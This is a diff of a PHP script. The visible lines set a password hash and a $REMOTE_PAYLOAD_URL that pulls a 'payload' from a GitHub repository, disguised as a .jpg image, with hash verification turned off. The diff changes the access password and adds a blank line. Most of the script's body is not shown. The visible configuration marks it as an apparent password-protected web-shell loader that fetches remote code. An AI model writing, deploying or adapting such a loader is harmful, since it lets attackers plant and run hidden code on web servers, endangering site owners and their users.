@@ -1,6 +1,6 @@
 <?php
 session_start();
-$PW_HASH = '$2a$12$dtPodlgS1x.ggs0HEfn9fOVfwKSlaXtd8tWJvSwjdENzpTleDHXsK'; // buat disini : https://bcrypt-generator.com/
+$PW_HASH = '$2a$12$YqEamJ7pc6p.b3cGrhkHBuLxVLKdNB/UfzbmRjblUnMGXiW1jw/KW'; // buat disini : https://bcrypt-generator.com/
 $REMOTE_PAYLOAD_URL = 'https://raw.githubusercontent.com/eclibesec/hastalavista/refs/heads/main/cukong.jpg';
 $EXPECTED_PAYLOAD_HASH = null;
 $CURL_TIMEOUT = 8;
@@ -119,4 +119,5 @@ if ($pos !== false) {
 }
 echo $html;
 exit;
+
 ?>
